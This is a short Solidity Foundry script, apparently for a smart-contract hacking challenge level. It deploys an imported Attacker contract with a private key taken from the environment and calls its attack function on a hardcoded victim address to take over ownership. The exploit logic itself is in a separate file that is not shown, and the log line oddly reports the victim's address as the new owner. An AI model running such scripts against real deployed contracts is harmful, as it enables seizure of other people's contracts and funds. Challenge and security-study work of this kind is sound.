// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Script, console} from "forge-std/Script.sol";
import {Attacker} from "../src/lv4-attacker.sol";

contract Exploit is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        address victimAddress = 0xEb28Cf3c57C0affAc1058b1dAA77F0eA16aec2a5;

        vm.startBroadcast(deployerPrivateKey);

        Attacker attacker = new Attacker();
        attacker.attack(victimAddress);
        console.log("Owner changed to: %s", victimAddress);

        vm.stopBroadcast();
    }
}
